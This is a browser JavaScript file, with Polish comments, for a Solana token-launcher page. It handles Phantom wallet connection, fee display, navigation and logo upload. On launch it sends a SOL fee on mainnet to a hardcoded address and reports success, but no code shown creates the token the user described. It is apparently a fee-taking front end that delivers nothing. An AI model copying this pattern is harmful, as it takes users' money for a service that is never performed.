// Polyfill dla Buffer jeśli potrzebny
if (typeof window.Buffer === 'undefined') {
    window.Buffer = require('buffer').Buffer;
}

document.addEventListener('DOMContentLoaded', function() {
    const socialToggle = document.getElementById('social-links-toggle');
    const feeInfo = document.getElementById('fee-info');
    
    // Ustawienia opłat
    let baseFee = 0.3;
    let socialFee = 0.1;
    let totalFee = baseFee;

    function updateFeeDisplay() {
        const additionalFees = [];
        
        if (socialToggle.checked) {
            additionalFees.push({
                name: 'Social Links',
                value: socialFee
            });
        }
        
        totalFee = baseFee + additionalFees.reduce((sum, fee) => sum + fee.value, 0);
        
        feeInfo.innerHTML = `
            <div class="base-fee">Base fee: <span>${baseFee} SOL</span></div>
            ${additionalFees.length > 0 ? `
                <div class="additional-fees">
                    ${additionalFees.map(fee => `
                        <div class="fee-item">
                            <span>${fee.name}:</span>
                            <span class="fee-value">+${fee.value} SOL</span>
                        </div>
                    `).join('')}
                </div>
            ` : ''}
            <div class="total-fee">Total: ${totalFee} SOL</div>
        `;
    }
    
    socialToggle.addEventListener('change', updateFeeDisplay);
    updateFeeDisplay();
});

// Konfiguracja
const APP_ENV = 'production';
const NETWORK = solanaWeb3.clusterApiUrl('mainnet-beta');
const RECIPIENT_ADDRESS = '69vedYimF9qjVMosphWbRTBffYxAzNAvLkWDmtnSBiWq';

// Zmienne globalne
let wallet;
let connection;

// Inicjalizacja aplikacji
document.addEventListener('DOMContentLoaded', async function() {
    connection = new solanaWeb3.Connection(NETWORK, 'confirmed');
    await initWallet();
    initNavigation();
    initTokenForm();
    initLogoUpload();
});

// Integracja z Phantom Wallet
async function initWallet() {
    if (APP_ENV === 'development' && !window.solana) {
        console.warn('Development mode - Phantom mock');
        window.solana = {
            connect: async () => ({ publicKey: { toString: () => 'DEV_WALLET' } }),
            isConnected: false,
            on: () => {},
            disconnect: async () => {}
        };
    }

    if (!window.solana) {
        alert('Phantom Wallet not installed!');
        return;
    }

    wallet = window.solana;
    
    if (wallet.isConnected) {
        await handleWalletConnect();
    }
    
    wallet.on('connect', handleWalletConnect);
    wallet.on('disconnect', handleWalletDisconnect);
    
    document.getElementById('connect-wallet').addEventListener('click', toggleWalletConnection);
}

async function toggleWalletConnection() {
    try {
        if (!wallet.isConnected) {
            await wallet.connect();
        } else {
            await wallet.disconnect();
        }
    } catch (error) {
        console.error('Wallet connection error:', error);
        alert('Connection error: ' + error.message);
    }
}

async function handleWalletConnect() {
    const btn = document.getElementById('connect-wallet');
    const addressDiv = document.getElementById('wallet-address');
    
    if (wallet && wallet.publicKey) {
        const shortAddress = `${wallet.publicKey.toString().slice(0, 4)}...${wallet.publicKey.toString().slice(-4)}`;
        btn.textContent = 'Connected';
        btn.classList.add('connected');
        addressDiv.textContent = shortAddress;
        addressDiv.style.display = 'block';
    }
}

function handleWalletDisconnect() {
    const btn = document.getElementById('connect-wallet');
    const addressDiv = document.getElementById('wallet-address');
    btn.textContent = 'Connect Wallet';
    btn.classList.remove('connected');
    addressDiv.style.display = 'none';
}

// Nawigacja
function initNavigation() {
    const sections = document.querySelectorAll('section');
    const navLinks = document.querySelectorAll('.nav-link');

    function showSection(sectionId) {
        sections.forEach(s => {
            s.classList.remove('active-section');
            s.classList.add('hidden-section');
        });
        
        const target = document.getElementById(sectionId);
        if (target) {
            target.classList.remove('hidden-section');
            target.classList.add('active-section');
        }
        
        navLinks.forEach(link => {
            link.classList.remove('active');
            if (link.getAttribute('href') === `#${sectionId}`) {
                link.classList.add('active');
            }
        });
        
        window.scrollTo({ top: 0, behavior: 'smooth' });
    }
    
    navLinks.forEach(link => {
        link.addEventListener('click', function(e) {
            const href = this.getAttribute('href');
            if (href.startsWith('#')) {
                e.preventDefault();
                showSection(href.substring(1));
                history.pushState(null, null, href);
            }
        });
    });
    
    const homeCreateBtn = document.querySelector('.create-token-btn');
    if (homeCreateBtn) {
        homeCreateBtn.addEventListener('click', function(e) {
            e.preventDefault();
            showSection('create-token');
            history.pushState(null, null, '#create-token');
        });
    }
    
    window.addEventListener('popstate', function() {
        const hash = window.location.hash.substring(1);
        showSection(hash || 'home');
    });
    
    showSection(window.location.hash.substring(1) || 'home');
}

// Formularz tworzenia tokena
function initTokenForm() {
    const launchBtn = document.getElementById('launch-btn');
    if (!launchBtn) return;
    
    document.getElementById('social-links-toggle').addEventListener('change', function() {
        document.getElementById('social-fields').style.display = this.checked ? 'block' : 'none';
    });
    
    launchBtn.addEventListener('click', async function() {
        if (!wallet?.isConnected) {
            alert('Please connect your wallet first');
            return;
        }

        // Walidacja formularza
        const tokenName = document.getElementById('token-name').value.trim();
        const tokenSymbol = document.getElementById('token-symbol').value.trim();
        const tokenSupply = document.getElementById('token-supply').value;

        if (!tokenName || tokenName.length > 32) {
            alert('Invalid token name (1-32 chars)');
            return;
        }

        if (!tokenSymbol || tokenSymbol.length > 10) {
            alert('Invalid token symbol (1-10 chars)');
            return;
        }

        if (!tokenSupply || isNaN(tokenSupply) || tokenSupply <= 0) {
            alert('Invalid token supply');
            return;
        }

        try {
            const feeText = document.querySelector('.total-fee').textContent;
            const amount = parseFloat(feeText.match(/[\d.]+/)[0]);
            
            // Przygotowanie transakcji
            const transaction = new solanaWeb3.Transaction().add(
                solanaWeb3.SystemProgram.transfer({
                    fromPubkey: wallet.publicKey,
                    toPubkey: new solanaWeb3.PublicKey(RECIPIENT_ADDRESS),
                    lamports: solanaWeb3.LAMPORTS_PER_SOL * amount
                })
            );

            // Ustawienie parametrów transakcji
            const { blockhash } = await connection.getRecentBlockhash();
            transaction.recentBlockhash = blockhash;
            transaction.feePayer = wallet.publicKey;

            // Wysłanie do Phantom do potwierdzenia
            const { signature } = await wallet.signAndSendTransaction(transaction);
            
            // Oczekiwanie na potwierdzenie
            const result = await connection.confirmTransaction(signature, 'confirmed');
            
            if (result.value.err) {
                throw new Error('Transaction rejected');
            }
            
            alert(`Success! Transaction confirmed.\nSignature: ${signature}`);
            
        } catch (error) {
            console.error('Transaction error:', error);
            alert(`Transaction failed: ${error.message}`);
        }
    });
}

// Upload logo
function initLogoUpload() {
    const uploadArea = document.getElementById('logo-upload-area');
    const fileInput = document.createElement('input');
    fileInput.type = 'file';
    fileInput.accept = 'image/*';
    fileInput.hidden = true;
    document.body.appendChild(fileInput);

    uploadArea.addEventListener('click', () => fileInput.click());
    
    uploadArea.addEventListener('dragover', (e) => {
        e.preventDefault();
        uploadArea.classList.add('dragover');
    });

    uploadArea.addEventListener('dragleave', () => {
        uploadArea.classList.remove('dragover');
    });

    uploadArea.addEventListener('drop', (e) => {
        e.preventDefault();
        uploadArea.classList.remove('dragover');
        if (e.dataTransfer.files.length) {
            fileInput.files = e.dataTransfer.files;
            handleFileSelect(fileInput.files[0]);
        }
    });

    fileInput.addEventListener('change', () => {
        if (fileInput.files.length) {
            handleFileSelect(fileInput.files[0]);
        }
    });

    function handleFileSelect(file) {
        if (!file.type.match('image.*')) {
            alert('Please select an image file');
            return;
        }

        const reader = new FileReader();
        reader.onload = (e) => {
            uploadArea.innerHTML = '';
            const img = document.createElement('img');
            img.src = e.target.result;
            img.style.maxWidth = '100%';
            img.style.maxHeight = '100%';
            img.style.objectFit = 'contain';
            uploadArea.appendChild(img);
        };
        reader.readAsDataURL(file);
    }
}
